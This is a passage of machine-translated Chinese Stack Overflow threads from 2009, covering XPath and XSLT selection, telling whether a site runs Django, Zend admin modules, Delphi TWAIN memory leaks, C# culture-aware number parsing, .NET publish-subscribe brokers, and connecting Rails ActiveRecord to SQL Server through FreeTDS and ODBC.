a/b/*[local-name()='c' or local-name()='d' or local-name()='e'] 
```

**既过长又不正确**。此 XPath 表达式将选择如下节点：

```
OhMy:c

NotWanted:d 

QuiteDifferent:e 
```

* * *

## 回答 #2

> 赞同：49
> 
> 时间：2009-04-06T15:22:03.017

您可以使用属性测试来避免重复：

```
a/b/*[local-name()='c' or local-name()='d' or local-name()='e'] 
```

与 Dimitre 的反对意见相反，在 OP 没有指定与命名空间的交互的真空中，上述内容*并非不正确。*`self::`轴是名称空间限制的，不是`local-name()`。如果 OP 的意图是`c|d|e`无论命名空间如何都进行捕获（考虑到问题的 OR 性质，我认为这甚至是一种可能的情况），那么它是“另一个仍然有一些正面投票的答案”，这是不正确的。

如果没有定义，你就无法确定，但如果 OP 澄清了他的问题以至于我不正确，我很乐意将我的答案删除为真正不正确。

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2011-03-30T04:56:17.903

为什么不`a/b/(c|d|e)`呢？我刚刚尝试使用[Saxon XML 库](http://saxonica.com/welcome/welcome.xml)（很好地包装了一些 Clojure 的优点），它似乎工作。 `abc.xml`是OP描述的文档。

```
(require '[saxon :as xml])
(def abc-doc (xml/compile-xml (slurp "abc.xml")))
(xml/query "a/b/(c|d|e)" abc-doc)
=> (#<XdmNode <c>C1</c>>
    #<XdmNode <d>D1</d>>
    #<XdmNode <e>E1</e>>
    #<XdmNode <c>C2</c>>
    #<XdmNode <d>D2</d>>
    #<XdmNode <e>E1</e>>) 
```

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2009-04-06T15:38:35.397

不确定这是否有帮助，但使用 XSL，我会做类似的事情：

```
<xsl:for-each select="a/b">
    <xsl:value-of select="c"/>
    <xsl:value-of select="d"/>
    <xsl:value-of select="e"/>
</xsl:for-each> 
```

并且此 XPath 不会选择 B 节点的所有子节点：

```
a/b/* 
```

# django - 你如何判断一个网站是否是用 Django 制作的？

> ID：721934
> 
> 赞同：13
> 
> 时间：2009-04-06T15:20:00.900
> 
> 标签：django

我正在查看的一家公司声称使用 Django 为航空公司和家具店制作了网站，但是当我查看这些网站时，没有迹象表明底层的 Web 技术是什么。你怎么知道？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-05-13T19:24:05.667

这是一个相当古老的问题，但我没有看到任何规范的答案。正如其他答案所指出的那样，没有确定的方法可以知道，如果有人*想*隐藏他们正在使用 Django 的事实，他们可以。也就是说，你总是可以做一些侦探工作，并有信心确定它是否使用 Django。如果这是您的目标，那么您可以留意以下一些强有力的指标：

### 管理面板

首先，检查网站是否有`/admin/`页面。如果是这样，并且它提供了熟悉的 Django 管理员登录页面，那么您有 99% 的把握（除非有人费了很多力气让它*看起来*像 Django）。

### 形式

您可以在表单中查看许多内容：

*   `id`属性以开头的表单字段`id_`
*   检查具有名称的隐藏字段`csrfmiddlewaretoken`
*   如果站点有表单集，请检查`-TOTAL-FORMS`并`-DELETE`隐藏输入。

### 饼干

*   如果站点使用该`contrib.auth`包进行身份验证，您可能会`sessionid`在登录时看到一个名为被设置的 cookie。
*   表单也可能会设置一个名为`csrftoken`.

### 尾随斜杠

URL 后面的斜杠，和/或如果您尝试转到没有斜杠的页面，则将您重定向到带有斜杠的页面。这是 Django 的默认行为，据我所知，这在其他框架中并不常见。但请注意，它可以在 Django 中轻松停用。

### 错误页面

失败了所有这些，或者仍然不相信，你可以尝试强制错误页面，并尝试从中学习一些东西。转到带有 404 页面的未映射 URL，看看是否`DEBUG`仍然是真的（在这种情况下，您可能应该通知所有者他们对他们的网站不是很安全）。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-04-06T15:24:29.860

您可以尝试一些事情，例如尝试查找错误页面，并检查 Django 创建的管理面板的默认位置，但总体而言，无法确定给定站点使用的技术。

另请参阅：[https ://stackoverflow.com/questions/563316/is-there-a-generic-way-to-see-what-is-a-website-running-on/563335#563335](https://stackoverflow.com/questions/563316/is-there-a-generic-way-to-see-what-is-a-website-running-on/563335#563335)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2011-04-14T03:05:31.103

寻找csrf输入框。这存在于任何形式上。但这可以关闭，虽然不是很推荐。此外，如果它是 django 的旧版本，则可能不存在。但如果它在那里，它就是一个强有力的指标。

这存在于任何具有发布表单的页面上。它看起来像这样：

```
<input type='hidden' name='csrfmiddlewaretoken' value='3b3975ab79cec7ac3a2b9adaccff7572' /> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-04-06T16:33:19.353

导航到带有表单集的页面，并检查是否有 *-TOTAL_FORMS 或 *-DELETE 隐藏输入。这并不能证明他们正在使用 Django，但可能是他们正在使用的线索（使用提到的模型表单集）。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-04-06T15:21:44.360

尝试导航到某些 404 错误页面，或类似的东西。机会很小，但尝试找到一个默认的 django 错误页面。

您也可以尝试登录`www.website.com/admin`并查看是否获得了默认的 django 管理页面。

除此之外，如果这不起作用，那么**你就不能**。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-06T15:24:40.343

据我所知，没有可靠的指标，但您可以检查 /admin/ URL 以查看您是否获得了标准的管理应用程序，或者有时提要 URL 使用与通用后缀相比的通用前缀（尽管这可能不是指标只是开发人员的偏好）。

尝试触发调试页面（通过 404 或使用一些可能导致内部错误的损坏输入）也可能是一个好方法（尽管这更像是对原始开发人员和管理员能力的测试而不是其他任何事情：- ) )

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-04-06T15:39:35.033

你能问航空公司和/或家具店吗？我猜你想知道这家公司是否在 django 方面有很好的经验，如果你正在考虑与他们合作，我认为请求参考是合理的。

其他公司可能很乐意讨论使用了哪些技术——有些是，有些不是，但值得一问。

# zend-framework - Zend 中的管理屏幕：控制器还是模块？

> ID：721938
> 
> 赞同：1
> 
> 时间：2009-04-06T15:20:50.150
> 
> 标签：zend-framework

我将在我的 ZF 应用程序中创建管理屏幕。我应该使用单独的控制器还是单独的模块来包含管理部分？

我的假设是这与应用程序大小有关。如果它很小，使用控制器作为管理部分是可以的，不是吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T15:27:06.640

我看不出有什么问题。将每个屏幕保持为单独的操作，只需一个 AdminController 就足够了。

另一方面，如果管理区域可能会发展为更大的应用程序，您不妨现在为其创建一个单独的模块。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T15:26:50.027

我想你是正确的。如果它是一个小站点，它不会成为问题。但对于大型网站，我建议使用单独的管理控制器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T16:38:22.087

无论应用程序大小如何，我总是使用单独的模块，对我来说这似乎更有意义。给定一个典型的应用程序（例如似乎是常见方法的博客），您可能希望管理（作为管理员）用户、帖子、评论等......

如果管理区域只是控制器，那么帖子就是操作，但这似乎没有多大意义。管理部分是实际区域（不是您要*控制*的区域）。您正试图控制一个帖子或一组帖子（控制器）。您对他们所做的（创建、编辑、删除、更新、审核等）将是行动。

# delphi - Delphi Twain 问题帮助

> ID：721948
> 
> 赞同：1
> 
> 时间：2009-04-06T15:22:13.593
> 
> 标签：delphi, twain

[使用来自http://delphitwain.sourceforge.net/](http://delphitwain.sourceforge.net/)的 DelphiTwain 文件，我得到了一些奇怪的行为。

1.  每次扫描后，都会保留更多内存。
2.  经过一个小时左右的重复扫描后，扫描的图像被放大了大约 10 倍，只存储了左上角平方英寸。

有没有人遇到过类似的问题，或者有什么建议？

下面的代码...

```
try
  try
    Twain := TDelphiTwain.Create(self);

    Twain.OnTwainAcquire := TwainAcquireHandler; //manually set the event handler
    Twain.OnSourceFileTransfer := TwainSourceFileTransfer;
    Twain.OnSourceSetupFileXfer := TwainSourceSetupFileXfer;

    Twain.LoadLibrary;
    Twain.LoadSourceManager;
    Twain.Source[0].Loaded := TRUE;
    Twain.Source[0].TransferMode := ttmFile;
    Twain.Source[0].EnableSource(false, false);
  except on e : exception do
    showmessage('Error loading Scanner.');
  end;

  try
    while Twain.Source[0].Enabled do
      Application.ProcessMessages;
  except on e : exception do
    showmessage('Error Scanning Packing List.');
  end;
finally
  Twain.Source[0].Loaded := FALSE;
  Twain.UnloadSourceManager(true);
  Twain.UnloadLibrary;
  Twain.Destroy;
end; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T17:46:03.310

由于 TDelphiTwain 似乎是您在代码中创建的组件，因此我建议为构造函数传入**nil**并调用 .Free 方法或（如 Joseph 所建议的）FreeAndNil。

```
Twain := TDelphiTwain.Create(nil);
try
  try
    Twain.OnTwainAcquire := TwainAcquireHandler; //manually set the event handler
    Twain.OnSourceFileTransfer := TwainSourceFileTransfer;
    Twain.OnSourceSetupFileXfer := TwainSourceSetupFileXfer;

    Twain.LoadLibrary();
    Twain.LoadSourceManager();
    Twain.Source[0].Loaded := True;
    Twain.Source[0].TransferMode := ttmFile;
    Twain.Source[0].EnableSource(False, False);
  except on e : exception do
    showmessage('Error loading Scanner.');
  end;

  try
    while Twain.Source[0].Enabled do
      Application.ProcessMessages;
  except on e : exception do
    showmessage('Error Scanning Packing List.');
  end;
  Twain.Source[0].Loaded := False;
  Twain.UnloadSourceManager(True);
  Twain.UnloadLibrary();
finally
  FreeAndNil(Twain);
end; 
```

我还建议更好的异常处理，但与您提出的问题无关。用户唯一会看到并向您报告（或者更糟糕的是，角落里负责您的 IT 支持的安静的人，他喜欢从用户那里得到非描述性错误）是“做某事时出错”

祝你好运

另一个需要关注的领域是扫描仪是否支持 WIA（Windows 图像采集）

```
var
  DevMgr: IDeviceManager;
  Scanner: Idevice;
  Picture: IItem;
  Image: OleVariant;
  AImage: IImageFile;
begin
  DevMgr := CreateOleObject('WIA.DeviceManager') as IDeviceManager;

  // Figure out which device is the scanner
  Scanner:= DevMgr.DeviceInfos.Item[1].Connect;

  //Command: Figure out which command scans..
  Picture := Scanner.ExecuteCommand(Scanner.Commands.Item[1].CommandID);

  //Transfer as JPG
  Image := Picture.Transfer(Picture.Formats.Item[1]);

  //Save the image
  AImage := IImageFile(Image);
  AImage.SaveFile('c:\wia_viaScanner\image.' + AImage.FileExtension);
end; 
```

可以在此处找到有关 WIA 库的更多信息.. [http://msdn.microsoft.com/en-us/library/ms629859(VS.85).aspx](http://msdn.microsoft.com/en-us/library/ms629859(VS.85).aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T17:21:00.830

检查这些调用中的代码可能会很有成效：

```
TwainAcquireHandler;
TwainSourceFileTransfer;
TwainSourceSetupFileXfer; 
```

这些中的任何一个是否在不释放它们的情况下创建了任何对象？

如果您使用的是 Delphi 2006 或更高版本，则可以将此行添加到您的 .DPR 文件中：

```
 ReportMemoryLeaksOnShutdown := True; 
```

然后重现内存泄漏，关闭您的应用程序......它将详细描述泄漏。[可以在此处找到](http://delphi.about.com/od/adptips2006/qt/memory_leak.htm)有关此的更多信息。

另一方面，我建议更换

```
Twain.Destroy; 
```

和

```
FreeAndNil(Twain); 
```

.Destroy 将直接调用析构函数，而 FreeAndNil 是一种更安全的替代方法，它还可以防止“Twain”变量指向任何危险的地方。（请参阅此问题的已接受[答案](https://stackoverflow.com/questions/235033/why-are-delphi-objects-assigned-even-after-calling-free)）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-06T06:54:54.957

**致 KevinRF：**
我需要在 Delphi 7 项目中使用 WIA 自动化。我在我的系统中注册了 WIAAut.dll，将此库导入 Delphi 并将您的程序代码传递到我的项目中，但出现了一些错误：

```
Scanner:= DevMgr.DeviceInfos.Item[1].Connect; 
```

“Item”中实际和形式var参数的类型必须相同
，必须是Item[var Index: OleVariant]，但“1”是整数

怎么了，我需要什么让它工作？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T17:22:37.830

当你得到图像时你在做什么，你记住了吗？或者库可能有一些内存泄漏，您可以使用 FastMM4 检查是否属实。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-06T16:46:00.117

我无法解决您报告的问题，但是您那里有一个繁忙的循环，会占用 CPU 时间。

# c# - Double.Parse - 国际化问题

> ID：721950
> 
> 赞同：18
> 
> 时间：2009-04-06T15:22:40.957
> 
> 标签：c#, string, double, culture, cultureinfo

这真让我抓狂。我在 ASP.NET 2.0 WebForm 页面中有以下字符串

```
string s = "0.009"; 
```

很简单。现在，如果我的文化是西班牙语——即“es-ES”——并且我尝试将字符串转换为 Double，我会执行以下操作：

```
double d = Double.Parse(s, new CultureInfo("es-ES")); 
```

我期望的是 0,009。相反，我得到 9。我知道 .NET 认为它是千位分隔符，在 en-US 中是逗号，但它不应该将我传递给解析方法的文化信息应用到转换？

如果我做

```
double d = 0.009D;
string formatted = d.ToString(new CultureInfo("es-ES")); 
```

格式化现在是 0,009。有人吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2009-04-06T15:26:29.247

它**采用**您提供的文化并应用正确的格式。您提供了一串“0.009”并告诉它是西班牙语……然后您抱怨它正确地将其解释为西班牙语！当您知道字符串不是西班牙语时，不要告诉它该字符串是西班牙语。

您应该将要解析的字符串的区域性传递给 Parse 方法，在本例中为 en-US 或 en-Gb 或 InvariantCulture。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2010-05-19T21:25:39.890

杰西的作品对我有用。仅适用于需要尝试如何获得“不变文化”的任何人：看起来像这样

`double d = Double.Parse(myString, CultureInfo.InvariantCulture);`

（第一个stackoverflow帖子，所以是的，相当边缘；）

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-04-06T15:26:57.453

你倒过来了。

当您说 时`double d = Double.Parse(s, new CultureInfo("es-ES"));`，您是在要求 .NET 将您的字符串解析为双精度，假设该字符串是用 es-ES 文化编写的。

在西班牙文化中，“。” 是千位分隔符，所以“0.009”是 9。

最后，当您使用 ToString() 进行转换时，它表示使用西班牙文化将 0.009 转换为字符串，因此它使用“，”作为小数分隔符，得到“0,009”。行为是正确的。

我的猜测是您想将 Double.Parse 与 Invariant Culture 一起使用，并将 ToString 与西班牙文化一起使用，因此 0.009 变为 0,009。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-04-06T15:29:39.130

我认为您对它的解释是错误的，在 es-ES 文化中，0.009 实际上只是将 9 称为“。”。不是小数点分隔符，因此如果您要求使用 es-ES 文化*解析*字符串“0.009”，您确实应该得到 deouble 9.0。如果你让它解析“0,009”，你应该得到一个 0.009 的两倍。

同样，如果您要求它*格式化*双精度 0.009，您应该在 es-ES 中得到字符串“0,009”。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-04-06T15:27:30.493

您错误地解析和格式化。您第一次得到 9 而不是 .009，因为您采用基于 . 的文化格式的字符串并使用基于 , 的文化解析它。您需要使用创建它的任何文化对其进行解析，然后使用您想要显示的任何文化对其进行格式化。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-04-06T15:32:05.427

```
double d = Double.Parse("0,009",
    NumberStyles.AllowDecimalPoint | NumberStyles.AllowThousands,
    CultureInfo.CreateSpecificCulture("es-ES")); 
```

在 es-ES 文化中，“，”是十进制分隔符（不是“.”）

# .net - 我应该使用什么技术来实现可从 .NET 访问的持久订阅者？

> ID：721954
> 
> 赞同：2
> 
> 时间：2009-04-06T15:23:14.543
> 
> 标签：.net, messaging, publish-subscribe

假设是一个绿色项目，选择何种技术、库、中间件等可以最容易地在 Windows 和 .NET 上通过持久订阅实现发布-订阅消息传递？我使用 Google 找到了 WCF Peer Channel，这似乎可以满足我的大部分需求，但我认为它不能保证消息排序，也不能将消息持久保存到磁盘以确保可靠性。微软说这些功能可以叠加在上面，但我一直在寻找已经拥有它们的东西。

MSMQ 分发列表接近我想要的，但我更喜欢消息传递层不必预先知道所有客户端的东西。

订阅人数并不多，大概不到20人。

发布者和订阅者都在 C#/.NET 中实现并在 Windows 上运行。

编辑：我正在研究面向消息的中间件和服务总线建议。我熟悉这个领域的企业级产品——我真的在寻找简单轻巧的东西。查看每个产品需要一段时间，但我会尝试总结我的发现。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-09T09:42:57.457

我已经完成了完全相同的事情（.Net 上的 C# 中的发布者和消费者），具有大量持久订阅，我实际上为此使用了 SonicMQ。虽然它被标榜为 JMS 提供者，但它拥有与运行异常良好的 JMS API 非常相似的纯 .net 客户端库。

我对 RabbitMQ 非常熟悉，如果它们用完代理的内存空间，它目前不支持持久订阅（因此它不能真正将它们流到磁盘）。对于您的消息流（生产者和消费者）都适合内存的情况，但当您需要持久的持久订阅系统时，这是一个很好的解决方案。

作为该项目的一部分，我评估了 ActiveMQ、Tibco EMS 和 FioranoMQ，而 SonicMQ 无疑是最好的解决方案，尤其是对于 C# 客户端。它很贵，但非常值得一看。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T15:50:43.230

你看过[RabbitMQ](http://www.rabbitmq.com/)吗？不能说我自己有过这方面的经验，但是当 Rabbit 的人在工作中进行技术演讲时，他们似乎知道他们在说什么 :)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-07T00:13:18.170

看看消息总线类型的架构怎么样。有几个开源总线实现位于 MSMQ 之上。

*   [服务总线](http://www.nservicebus.com/)
*   [轨道交通](http://code.google.com/p/masstransit/)
*   [犀牛服务巴士](http://ayende.com/Blog/archive/2008/12/17/rhino-service-bus.aspx)

使用这些库之一，您的服务可以在需要时发布“事件”（消息）。在启动时，服务器不需要任何配置提前告诉它有关客户端的信息。当客户端启动时，它们订阅一个已知的服务器端点，并且每当它引发消息时，服务器都会从那里发布给它们。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-08T15:29:49.330

Apache ActiveMQ 还支持 .NET（和许多其他语言）。开源，也可提供商业支持。

[http://activemq.apache.org](http://activemq.apache.org)

易于设置和配置。自动创建消息目的地。支持点对点和发布/订阅通信模型。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-05-13T08:34:52.503

我们基于 ZeroMq（传输）、Cassandra（对等发现和持久性）和 Protobuf（序列化）编写了对等消息总线 Zebus。

它是开源和生产测试的[https://github.com/Abc-Arbitrage/Zebus](https://github.com/Abc-Arbitrage/Zebus)

Zebus 正在积极开发中，并在大量内部生产中使用。

# windows - 使用 Windows Server 托管网站时的最低安全配置建议是什么

> ID：721958
> 
> 赞同：2
> 
> 时间：2009-04-06T15:23:56.990
> 
> 标签：windows, web-hosting

我正在使用 Windows Server 2003 来托管一些网站。我启用了 Windows 防火墙以及远程桌面和 FTP。我正在考虑安装 AVG Free 以获得基本保护。这够了吗？我应该在我的生产服务器上安装防病毒软件吗？

任何人都可以提供有关最低标准安全设置的任何提示吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T15:28:05.763

[安全合规性工具包](http://technet.microsoft.com/en-us/library/cc163140.aspx)可能会在使您的安全性达到标准方面为您提供很多帮助。

# sql-server - 使用 ActiveRecord 连接到 SQL Server

> ID：721960
> 
> 赞同：13
> 
> 时间：2009-04-06T15:24:02.997
> 
> 标签：sql-server, ruby-on-rails, activerecord

您是否曾经必须使用 ActiveRecord 连接到 SQL Server？这可能吗？谁能提供一些起点？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-04-06T15:36:15.027

这是我用的：

从这里：http: [//github.com/rails-sqlserver/2000-2005-adapter/tree/master](http://github.com/rails-sqlserver/2000-2005-adapter/tree/master)

*安装*

首先，您需要 Ruby DBI 和 Ruby ODBC。据我所知，不再支持用于 DBI 的 ADO DBD。下面的安装并不是全面介绍如何安装和/或配置 FreeTDS 等所有必需的移动部件。它还将假定依赖库和适配器本身的 gem 安装。

应该注意的是，这个版本的适配器是使用 DBI 的古老 0.0.23 版本到当前稳定版本 0.4.0 开发的。因为更高版本的 DBI 会改变很多东西，所以强烈建议您将安装升级到 0.4.0 版本，如下面的示例所示。目前我们不支持高于 0.4.0 的 DBI 版本。好消息是，如果您使用带有 ADO 的非常旧的 DBI，从技术上讲，这个适配器仍然可以为您工作，但请注意您的路径已经过时并且可能不会长期支持。

```
$ gem install dbi --version 0.4.0
$ gem install dbd-odbc --version 0.2.4
$ gem install rails-sqlserver-2000-2005-adapter -s http://gems.github.com 
```

从这里： http: [//lambie.org/2008/02/28/connecting-to-an-mssql-database-from-ruby-on-ubuntu/](http://lambie.org/2008/02/28/connecting-to-an-mssql-database-from-ruby-on-ubuntu/)

首先，更新您的 ~/.profile 以包含以下内容：

```
export ODBCINI=/etc/odbc.ini
export ODBCSYSINI=/etc
export FREETDSCONF=/etc/freetds/freetds.conf 
```

然后重新加载您的 .profile，注销并再次登录。

其次，在 Ubuntu 7.10 服务器上，我需要安装一些软件包。

```
mlambie@ubuntu:~$ sudo aptitude install unixodbc unixodbc-dev freetds-dev sqsh tdsodbc 
```

安装 FreeTDS 后，我可以像这样配置它：

```
mlambie@ubuntu:/etc/freetds$ cat freetds.conf
[ACUMENSERVER]
  host = 192.168.0.10
  port = 1433
  tds version = 7.0 
```

这里重要的是 ACUMENSERVER，它是我在连接数据库时将使用的 DSN。主机和端口是不言自明的，值得注意的是，我必须专门使用 7.0 作为 tds 版本。

测试 FreeTDS 并不难：

```
mlambie@ubuntu:~$ sqsh -S ACUMENSERVER -U username -P password
sqsh: Symbol `_XmStrings' has different size in shared object, consider re-linking
sqsh-2.1 Copyright (C) 1995-2001 Scott C. Gray
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> use acumen
2> go
1> select top 1 firstname, lastname from tblClients
2> go

[record returned]

(1 row affected)
1> quit 
```

接下来需要配置 ODBC：

```
mlambie@ubuntu:/etc$ cat odbcinst.ini
[FreeTDS]
Description     = TDS driver (Sybase/MS SQL)
Driver          = /usr/lib/odbc/libtdsodbc.so
Setup           = /usr/lib/odbc/libtdsS.so
CPTimeout       =
CPReuse         =
FileUsage       = 1

mlambie@ubuntu:/etc$ cat odbc.ini
[ACUMENSERVER]
Driver          = FreeTDS
Description     = ODBC connection via FreeTDS
Trace           = No
Servername      = ACUMENSERVER
Database        = ACUMEN 
```

然后我测试了与 isql 的连接：

```
mlambie@ubuntu:~$ isql -v ACUMENSERVER username password
+---------------------------------------+
| Connected!                            |
|                                       |
| sql-statement                         |
| help [tablename]                      |
| quit                                  |
|                                       |
+---------------------------------------+
SQL> use ACUMEN
[][unixODBC][FreeTDS][SQL Server]Changed database context to 'Acumen'.
[ISQL]INFO: SQLExecute returned SQL_SUCCESS_WITH_INFO
SQLRowCount returns -1
SQL> select top 1 firstname from tblClients;

[record returned]

SQLRowCount returns 1
1 rows fetched
SQL> quit 
```

好的，所以我们已经让 ODBC 使用 FreeTDS 连接到远程 MSSQL 服务器。剩下的就是将 Ruby 添加到组合中。

```
mlambie@ubuntu:~$ sudo aptitude install libdbd-odbc-ruby 
```

最后要测试的是 Ruby 可以使用 DBI 和 ODBC 来访问实际的数据库，这很容易测试：

```
mlambie@ubuntu:~$ irb
irb(main):001:0> require "dbi" 
=> true
irb(main):002:0> dbh = DBI.connect('dbi:ODBC:ACUMENSERVER', 'username', 'password')
=> #<DBI::DatabaseHandle:0xb7ac57f8 @handle=#<DBI::DBD::ODBC::Database:0xb7ac5744
@handle=#<odbc::database:0xb7ac576c>, @attr={}>, @trace_output=#</odbc::database:0xb7ac576c><io:0xb7cbff54>,
@trace_mode=2>
irb(main):003:0> quit 
```

还有一个更完整的测试（请注意，仅使用 SQL SELECT）：

```
#!/usr/bin/env ruby

require 'dbi'
db = DBI.connect('dbi:ODBC:ACUMENSERVER', 'username', 'password')
select = db.prepare('SELECT TOP 10 firstname FROM tblClients')
select.execute
while rec = select.fetch do
  puts rec.to_s
end
db.disconnect
</io:0xb7cbff54> 
```

从这里（修复 odbc lib 在错误的位置）： [http ://ubuntuforums.org/showthread.php?t=433435&page=2](http://ubuntuforums.org/showthread.php?t=433435&page=2)

```
libtdsodbc.so
with freeTDS (freetds-dev, tdsodbc), you can either edit the path in the odbcinst.ini file for the [FreeTDS] driver section OR cp the /usr/lib/odbc/libtdsodbc.so into /usr/lib/libtdsodbc.so. 
```

从提示符访问 mssql 时，任何一种方式都有效

```
isql -v $dsn $user $passwd 
```

我发现这很有用

[http://www.unixodbc.org/doc/FreeTDS.html#Configuration](http://www.unixodbc.org/doc/FreeTDS.html#Configuration)

然后在 database.yml 文件中：

```
development:
  adapter: sqlserver
  mode: odbc
  dsn: dsn_name
  username: my_username
  password: my_password 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-06-15T22:55:43.680

这些是我为 Centos 5.3 编译的步骤。我花了很多时间和错误来让这个工作。它来自一个完全干净的 Centos 安装。

安装 EPEL：

```
rpm -Uvh http://download.fedora.redhat.com/pub/epel/5/i386/epel-release-5-3.noarch.rpm 
```

安装ruby、rubygems、freetds、unixODBC、开发工具：

```
yum install gcc
yum install freetds
yum install ruby-devel
yum install unixODBC-devel
yum install ruby rubygems 
```

安装导轨：

```
gem install rails 
```

安装数据库相关的 gem：

```
gem install dbd-odbc
gem install rails-sqlserver-2000-2005-adapter -s http://gems.github.com 
```

下载、构建和安装 ruby​​-odbc：

```
wget http://www.ch-werner.de/rubyodbc/ruby-odbc-0.9997.tar.gz
tar zxvf ruby-odbc-0.9997.tar.gz
cd ruby-odbc-0.9997
ruby extconf.rb
make
make install 
```

最终宝石清单：

```
# gem list

*** LOCAL GEMS ***

actionmailer (2.3.2)
actionpack (2.3.2)
activerecord (2.3.2)
activeresource (2.3.2)
activesupport (2.3.2)
dbd-odbc (0.2.4)
dbi (0.4.1)
deprecated (2.0.1)
rails (2.3.2)
rails-sqlserver-2000-2005-adapter (2.2.17)
rake (0.8.7) 
```

您可以使用 isql 等各种工具来测试您的 ODBC 连接。Brian 的帖子详细介绍了这一点，所以我不会重复。在 Rails 中，您需要一个如下所示的 database.yml：

```
development:
  adapter: sqlserver
  mode: odbc
  dsn: dsnName
  username: username
  password: password 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-20T02:29:12.333

在 Ubuntu 上，我使用 FreeTDS 和 activerecord-sqlserver-adapter gem。

您可以通过 apt 安装 FreeTDS：

```
sudo apt-get install freetds 
```

并将其添加到您的 Gemfile 中：

```
gem 'activerecord-sqlserver-adapter' 
```

我必须将配置的 FreeTDS 版本号更改`/etc/freetds/freetds.conf`为`8.0`以使事情正常工作。

```
[global]
    tds version = 8.0 
```

[GitHub 上的 activerecord-sqlserver-adapter](https://github.com/PageUpPeopleOrg/activerecord-sqlserver-adapter)

[FreeTDS 项目](http://freetds.schemamania.org/)

# apache2 - 带有 mod_perl 的 Apache2，它不遵循符号链接；我怎样才能解决这个问题？

> ID：721962
> 
> 赞同：2
> 
> 时间：2009-04-06T15:24:33.743
> 
> 标签：apache2, symlink, mod-perl

`mod_perl/apache`似乎无法遵循符号链接。

在`httpd.conf`我有：

```
Options FollowSymLinks
<VirtualHost *>
        ServerName cas.devserver.com
        ServerAlias cas.devserver.com
        ServerAdmin webmaster@devserver.com
        DocumentRoot /var/www/htdocs/abc/def
        PerlSwitches -I/var/www/cgi-bin
        PerlSendHeader On
        <Location />
                Options FollowSymLinks
                PerlSendHeader On
                PerlHandler Test1::Test
                SetHandler perl-script
                Order deny,allow
                Allow from all
        </Location>
</VirtualHost> 
```

如果`/var/www/cgi-bin/Test1`是一个包含 的目录`Test.pm`，那么它可以工作。如果它是包含`Test.pm`( `/var/www/cgi-bin/test1/`) 的目录的符号链接，那么它会失败：

```
[error] [client xxx.xxx.xxx.xxx] failed to resolve handler `Test1::Test':
      Can't locate Test1/Test.pm in @INC
      (@INC contains: /var/www/cgi-bin/ <snip> /usr/lib/perl5/5.8.8 . /etc/httpd)
      at (eval 9) line 3.\n 
```

我检查了权限，它们看起来还可以。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T16:29:33.387

简单明了的问题，

您是否尝试过使用符号链接从命令行运行您的 cgi 脚本？

你不应该也添加到容器中吗？

```
Options +ExecCGI 
```

高温高压

干杯，

# xslt - XSLT 计算具有给定值的元素

> ID：721963
> 
> 赞同：23
> 
> 时间：2009-04-06T15:24:35.460
> 
> 标签：xslt, count, elements

我需要计算 XML 文件中具有特定值的元素的数量（以验证唯一性）。XML 文件如下所示：

**编辑：**我用某人设计的实际毛茸茸的混乱更新了原始的“简化”XML。不幸的是，除非经过编辑，否则这将使所有以前的答案变得非常混乱和错误。

```
<root>
  <ac>
   <Properties>
     <Property Name="Alive">
      <Properties>
        <Property Name="ID">
         <Properties>
           <Property Name="Value">
            <long>11007</long>
           </Property>
         </Properties>
        </Property>
      </Properties>
     </Property>
     <Property Name="Dead">
      <Properties>
        <Property Name="ID">
         <Properties>
           <Property Name="Value">
            <long>11008</long>
           </Property>
         </Properties>
        </Property>
      </Properties>
     </Property>
     ...
     <Property Name="MostlyDeadAllDay">
      <Properties>
        <Property Name="ID">
         <Properties>
           <Property Name="Value">
            <long>99001</long>
           </Property>
         </Properties>
        </Property>
      </Properties>
     </Property>
   </Properties>
  </ac>
</root> 
```

我正在尝试定义一个变量，以查看 Alive/Dead 级别的属性中有多少具有模板参数中定义的长值 (ID)。这些方面的东西（尽管我怀疑这是错误的）......

```
<xsl:param name="parPropId"/>
<xsl:variable name="countProperties">
   <xsl:value-of select="count(/root/ac/
      Properties/Property/
      Properties/Property[@Name = 'ID']/
      Properites/Property[@Name = 'Value']/long = $parPropId)"/>
</xsl:variable> 
```

在“ID”级别可以定义多个 Property 元素。但我相当肯定我只能指望“ID”下的一个 Property 元素（“Value”），以及“Value”下的一个“long”元素。

[免责声明] 设计整个 XML 文件的人确实不知道如何构建 XML（例如，向后使用属性与元素）。我担心我的 XSLT 想法因此暂时被扭曲了 :)。[/免责声明]

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2009-04-06T16:29:54.460

这个 XPath：

```
